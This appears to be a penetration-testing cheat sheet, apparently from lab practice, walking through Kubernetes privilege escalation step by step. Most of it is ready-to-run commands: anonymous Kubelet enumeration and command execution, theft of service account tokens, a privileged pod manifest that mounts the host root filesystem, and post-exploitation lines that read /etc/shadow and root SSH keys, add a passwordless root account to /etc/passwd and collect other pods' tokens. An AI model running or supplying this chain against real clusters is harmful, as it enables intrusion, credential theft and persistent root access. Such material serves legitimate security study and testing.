## Kubernetes (K8s) Privilege Escalation
Kubernetes privilege escalation exploits the trust relationships between cluster components, particularly the Kubelet API, service account tokens, and RBAC misconfiguration. The core attack chain is: anonymous Kubelet access -> extract service account token -> use token to create a privileged pod with `hostPath: /` -> read or write anything on the host. 
***
## Architecture Overview
```
Control Plane (Master Node)
  - kube-apiserver     :6443   (main entry point)
  - etcd               :2379/2380  (cluster state store)
  - kube-scheduler     :10251
  - controller-manager :10252

Worker Nodes (Minions)
  - Kubelet API        :10250  (executes pod commands)
  - Kubelet Read-Only  :10255  (unauthenticated info exposure)
  - kube-proxy         (network rules)
  - Pods               (running containers)
```

The Kubelet is the most common initial foothold because it allows anonymous access by default, and its `/exec` endpoint runs commands inside pods as whatever user the container runs as.

***
## Phase 1: Initial Enumeration
### Test API Server Access
```bash
# Anonymous probe of the API server
curl https://10.129.10.11:6443 -k
# 403 = anonymous access blocked, but server is reachable
# 200 = anonymous access enabled (critical misconfiguration)

# Test read-only Kubelet port (often unauthenticated)
curl http://10.129.10.11:10255/pods | jq .
```
### Enumerate Pods via Kubelet API
```bash
# Via curl
curl https://10.129.10.11:10250/pods -k | jq .

# Via kubeletctl (cleaner output)
kubeletctl -i --server 10.129.10.11 pods
```

Key data points to extract from pod output:
- Pod names and namespaces
- Container image names and versions (look up CVEs)
- Annotations containing `last-applied-configuration` (can leak secrets and tokens)
- `uid` and `resourceVersion` values for targeting

***
## Phase 2: RCE via Anonymous Kubelet
```bash
# Scan which pods allow command execution
kubeletctl -i --server 10.129.10.11 scan rce
# + = RCE allowed, - = blocked

# Execute a command in a vulnerable pod
kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx
# uid=0(root) gid=0(root) groups=0(root)

# Interactive shell
kubeletctl -i --server 10.129.10.11 exec "/bin/bash" -p nginx -c nginx
```

***
## Phase 3: Extract Service Account Credentials
Every pod has a service account token automatically mounted at a predictable path. Extracting it from a pod you can execute in gives you an identity to use against the API server. 

```bash
# Extract the bearer token
kubeletctl -i --server 10.129.10.11 \
    exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" \
    -p nginx -c nginx | tee k8.token

# Extract the CA certificate (required for TLS verification)
kubeletctl --server 10.129.10.11 \
    exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" \
    -p nginx -c nginx | tee ca.crt

# Also check for kubeconfig files on mounted host paths
kubeletctl -i --server 10.129.10.11 exec "find / -name kubeconfig 2>/dev/null" -p nginx -c nginx
```

***
## Phase 4: RBAC Enumeration with Extracted Token
```bash
export token=$(cat k8.token)

# Check what actions this service account is permitted to perform
kubectl --token=$token \
        --certificate-authority=ca.crt \
        --server=https://10.129.10.11:6443 \
        auth can-i --list

# Target output to look for:
# pods    []    []    [get create list]   <- create = game over
# secrets []    []    [get list]          <- can read secrets from other pods
```

If `create` is listed for `pods`, the path to full host access is open. 
***

## Phase 5: Privileged Pod Creation (hostPath Escalation)

Create a YAML manifest that mounts the host root filesystem into the pod. The `hostPath` volume type gives the container unrestricted read/write access to the node's filesystem. 

```yaml
# privesc.yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

```bash
# Deploy the pod
kubectl --token=$token --certificate-authority=ca.crt \
        --server=https://10.129.96.98:6443 \
        apply -f privesc.yaml

# Confirm it is running
kubectl --token=$token --certificate-authority=ca.crt \
        --server=https://10.129.96.98:6443 \
        get pods

# Read host root's SSH key via the new pod
kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" \
    -p privesc -c privesc
```

***
## Post-Exploitation Options via Mounted Host Filesystem
Once you have the privileged pod running with host root at `/root` inside the container: 

```bash
# Read all password hashes
kubeletctl --server 10.129.10.11 exec "cat /root/etc/shadow" -p privesc -c privesc

# Read root SSH key and connect
kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
chmod 600 id_rsa
ssh root@10.129.10.11 -i id_rsa

# Add root user to host /etc/passwd
kubeletctl --server 10.129.10.11 \
    exec "echo 'hacker::0:0:root:/root:/bin/bash' >> /root/etc/passwd" \
    -p privesc -c privesc

# Read tokens from other pods on the node (horizontal movement)
kubeletctl --server 10.129.10.11 \
    exec "find /root/var/run/secrets -name token" \
    -p privesc -c privesc

# Look for kubeconfig with cluster-admin role
kubeletctl --server 10.129.10.11 \
    exec "find /root -name kubeconfig 2>/dev/null" \
    -p privesc -c privesc
```

***
## Full Attack Chain Summary
```
1. curl :10250/pods -k                   Enumerate pods (anonymous Kubelet)
2. kubeletctl scan rce                   Find pods with exec enabled
3. kubeletctl exec "id"                  Confirm execution context
4. kubeletctl exec "cat .../token"       Extract service account token
5. kubeletctl exec "cat .../ca.crt"      Extract CA certificate
6. kubectl auth can-i --list             Check RBAC permissions with token
7. kubectl apply -f privesc.yaml         Deploy pod with hostPath: /
8. kubeletctl exec on new pod            Access host filesystem as root
```

***
## RBAC Permissions That Equal Privilege Escalation
| Permission | Why It's Dangerous |
|---|---|
| `pods: create` | Can spawn `hostPath: /` pod, full host access  [schutzwerk](https://www.schutzwerk.com/en/blog/kubernetes-privilege-escalation-01/) |
| `secrets: get/list` | Can read tokens from other service accounts |
| `clusterrolebindings: create` | Can bind cluster-admin to own account |
| `nodes/proxy` | Can reach Kubelet API through the API server with auth bypass  [aquasec](https://www.aquasec.com/blog/privilege-escalation-kubernetes-rbac/) |
| `pods/exec` | Exec into any running pod, including privileged ones |

Any one of these permissions in a service account token you extract from an anonymous Kubelet pod can be enough for full cluster compromise.
